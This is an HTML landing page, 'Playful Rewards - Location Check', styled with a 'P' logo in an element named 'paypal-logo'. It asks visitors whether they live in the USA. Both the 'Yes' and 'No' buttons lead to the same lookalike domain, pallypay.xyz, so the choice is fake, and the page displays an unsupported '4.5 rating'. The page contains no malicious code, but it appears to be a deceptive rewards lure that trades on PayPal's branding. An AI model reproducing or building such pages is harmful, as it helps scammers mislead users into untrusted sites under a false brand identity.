<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Playful Rewards - Location Check</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(180deg, #0a0e27 0%, #1a1535 50%, #2a1b3d 100%);
            min-height: 100vh;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background:
                radial-gradient(circle at 20% 30%, rgba(131, 56, 236, 0.2) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(255, 0, 110, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(0, 245, 255, 0.15) 0%, transparent 50%);
            animation: gradientShift 20s ease infinite;
            z-index: 0;
        }

        @keyframes gradientShift {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(5%, 5%) rotate(120deg); }
            66% { transform: translate(-5%, 5%) rotate(240deg); }
        }

        .container {
            max-width: 600px;
            width: 100%;
            text-align: center;
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            min-height: 100vh;
            padding: 20px 0;
        }

        .app-icon {
            width: 120px;
            height: 120px;
            background: linear-gradient(135deg, #00f5ff, #8338ec);
            border-radius: 28px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 48px auto;
            box-shadow: 0 20px 60px rgba(0, 245, 255, 0.3);
            position: relative;
        }

        .paypal-logo {
            font-size: 72px;
            font-weight: 900;
            color: white;
            font-family: 'Inter', sans-serif;
            letter-spacing: -2px;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
        }

        h1 {
            font-size: 48px;
            font-weight: 700;
            margin-bottom: 16px;
            line-height: 1.2;
        }

        .subtitle {
            font-size: 18px;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 56px;
        }

        .buttons {
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin-bottom: 48px;
        }

        .btn {
            width: 100%;
            padding: 20px 32px;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: block;
            position: relative;
            overflow: hidden;
        }

        .btn-primary {
            background: linear-gradient(135deg, #00f5ff, #8338ec);
            color: white;
            box-shadow: 0 8px 24px rgba(0, 245, 255, 0.4);
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.2);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .btn-primary:hover::before {
            width: 400px;
            height: 400px;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 32px rgba(0, 245, 255, 0.5);
        }

        .btn-primary span {
            position: relative;
            z-index: 1;
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            color: rgba(255, 255, 255, 0.7);
            border: 1px solid rgba(0, 245, 255, 0.2);
        }

        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.08);
            color: white;
            border-color: rgba(0, 245, 255, 0.4);
        }

        .rating {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 15px;
        }

        .star {
            background: linear-gradient(135deg, #00f5ff, #ff006e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 18px;
        }

        @media (max-width: 600px) {
            body {
                padding: 16px;
            }

            h1 {
                font-size: 32px;
                margin-bottom: 12px;
            }

            .app-icon {
                width: 90px;
                height: 90px;
                margin-bottom: 32px;
            }

            .paypal-logo {
                font-size: 52px;
            }

            .subtitle {
                font-size: 15px;
                margin-bottom: 40px;
            }

            .buttons {
                gap: 12px;
                margin-bottom: 32px;
            }

            .btn {
                padding: 16px 24px;
                font-size: 16px;
            }

            .rating {
                font-size: 14px;
            }

            .star {
                font-size: 16px;
            }
        }

        @media (max-width: 400px) {
            h1 {
                font-size: 28px;
            }

            .app-icon {
                width: 80px;
                height: 80px;
                margin-bottom: 28px;
            }

            .paypal-logo {
                font-size: 46px;
            }

            .subtitle {
                font-size: 14px;
                margin-bottom: 36px;
            }

            .btn {
                padding: 14px 20px;
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="app-icon">
            <div class="paypal-logo">P</div>
        </div>

        <h1>Do you live in the USA?</h1>
        <p class="subtitle">This helps us unlock the right rewards for you.</p>

        <div class="buttons">
            <a href="https://pallypay.xyz/" class="btn btn-primary">
                <span>Yes</span>
            </a>
            <a href="https://pallypay.xyz/" class="btn btn-secondary">
                No
            </a>
        </div>

        <div class="rating">
            <span class="star">‚≠ê</span>
            <span>4.5 rating</span>
        </div>
    </div>
</body>
</html>
